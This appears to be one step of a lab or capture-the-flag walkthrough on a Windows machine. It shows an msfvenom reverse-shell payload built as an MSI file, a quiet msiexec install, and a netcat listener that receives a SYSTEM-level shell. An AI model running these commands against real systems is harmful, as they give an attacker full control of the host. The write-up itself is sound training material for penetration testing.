# 6 privesc .msi

```
$ msfvenom -p windows/shell_reverse_tcp LPORT=5040 LHOST=192.168.49.125 -f msi -o kashz.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of msi file: 159744 bytes
Saved as: kashz.msi

# cp C:\xampp\htdocs\shenzi\wp-content\themes\twentytwenty\kashz.msi .

PS C:\Users\shenzi\Desktop> msiexec /quiet /qn /i kashz.msi

$ nc -lvnp 5040
listening on [any] 5040 ...
connect to [192.168.49.125] from (UNKNOWN) [192.168.125.55] 49915
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
